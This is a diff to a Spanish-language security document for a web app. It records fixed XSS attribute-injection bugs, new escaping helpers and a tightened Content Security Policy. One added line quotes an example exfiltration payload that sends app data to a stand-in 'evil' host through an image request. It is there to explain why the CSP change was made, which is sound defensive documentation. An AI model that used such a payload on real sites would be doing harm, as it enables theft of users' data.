@@ -1,6 +1,8 @@
 # SECURITY — Seguridad de ParfumTrack
 
 **Última auditoría 360°:** score 81/100 · 30 hallazgos analizados.
+**Última revisión de XSS:** 29/07/2026 — tres vectores de inyección en atributos
+encontrados, verificados explotables y cerrados. Ver [BUG_HISTORY.md](BUG_HISTORY.md) §BUG-26.
 Reportes en `standalone/auditoria-*.html`.
 
 ---
@@ -27,9 +29,17 @@ recuperación posible. No es un bug — es la contracara de la decisión de priv
 ## 2. Validaciones — cliente
 
 ### XSS
+
+🔴 **`esc()` es para TEXTO. `escAttr()` es para ATRIBUTOS. No son intercambiables.**
+`esc()` usa `textContent` → `innerHTML`, que **no escapa comillas**: dentro de un atributo
+no protege nada. Eso causó BUG-26 (tres vectores verificados explotables en 07/2026).
+
 | Defensa | Dónde |
 |---|---|
-| `esc()` obligatorio para datos del usuario en `innerHTML` | `11-utils.js:80` |
+| `esc()` para datos del usuario en **contenido** de `innerHTML` | `11-utils.js` |
+| **`escAttr()` para todo valor dentro de un atributo** | `11-utils.js` |
+| **`imgSrc()` / `esImagenSegura()`** — data URL de imagen validado **completo**, SVG excluido | `11-utils.js` |
+| **`_sanearImportado()`** — el backup se limpia al entrar a la base, no solo al renderizar | `10-data-management.js` |
 | **Ningún dato de usuario dentro de un `onclick=""`** | Delegación en `_initEventDelegation()` |
 | Mensajes de WhatsApp en base64 UTF-8-safe | `b64Encode`/`b64Decode` |
 | Ids de cuota como JSON percent-encoded | `data-cuota-id` |
@@ -99,7 +109,15 @@ frame-ancestors 'none'   ·   object-src 'none'   ·   base-uri 'self'   ·   fo
 
 **🟠 `'unsafe-inline'` en `script-src` es inevitable con esta arquitectura** — toda la app
 es un `<script>` inline. Es el costo consciente de la decisión de un solo archivo.
-La mitigación real es `esc()` + delegación de eventos.
+La mitigación real es `escAttr()`/`esc()` + delegación de eventos.
+
+**La CSP también contiene el daño, no solo lo previene.** `img-src` ya **no** incluye
+`https:`: con un XSS, `new Image().src='https://evil/?d='+datos` exfiltraba todo y la CSP
+no lo frenaba. Ninguna imagen de la app es externa. También se quitaron Google Fonts (las
+fuentes son locales, `fonts/fonts.css`) y OneSignal (no hay SDK en el cliente).
+
+🔴 **Un permiso de CSP que nadie usa es una vía de salida gratis.** Antes de agregar un
+dominio, verificá que algo lo necesite.
 
 ### Rate limiting
 
